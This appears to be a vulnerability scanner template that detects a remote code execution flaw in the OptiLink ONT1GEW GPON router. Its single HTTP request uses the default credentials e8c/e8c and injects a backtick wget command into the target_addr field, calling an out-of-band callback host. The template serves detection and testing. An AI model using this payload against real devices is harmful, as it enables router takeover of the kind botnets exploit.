id: optilink-ont1gew-gpon-rce
info:
  name: OptiLink ONT1GEW GPON Remote Code Execution
  author: gy741
  severity: critical
  description: OptiLink ONT1GEW GPON is a device that is vulnerable to remote code
    execution, which can allow attackers to inject commands into the system.
  reference:
  - https://packetstormsecurity.com/files/162993/OptiLink-ONT1GEW-GPON-2.1.11_X101-Remote-Code-Execution.html
  - https://www.fortinet.com/blog/threat-research/the-ghosts-of-mirai
  classification:
    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 10.0
    cwe-id: CWE-77
  tags: optiLink,rce,oast,mirai,packetstorm
  metadata:
    impact: The impact of the OptiLink ONT1GEW GPON Remote Code Execution vulnerability
      is that an attacker could inject malicious commands into the affected device,
      potentially causing disruption and data theft.
    recommendation: It is recommended to update OptiLink ONT1GEW GPON to its latest
      version to mitigate the risk of remote code execution vulnerabilities.
requests:
- raw:
  - 'POST /boaform/admin/formTracert HTTP/1.1

    Host: {{Hostname}}

    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8

    Content-Type: application/x-www-form-urlencoded

    Origin: {{BaseURL}}

    Referer: {{BaseURL}}/diag_ping_admin_en.asp

    User: e8c

    Password: e8c


    target_addr="1.1.1.1+`wget+http%3A%2F%2F{{interactsh-url}}%2F`"&waninf=127.0.0.1"

    '
  matchers:
  - type: word
    part: interactsh_protocol
    words:
    - http
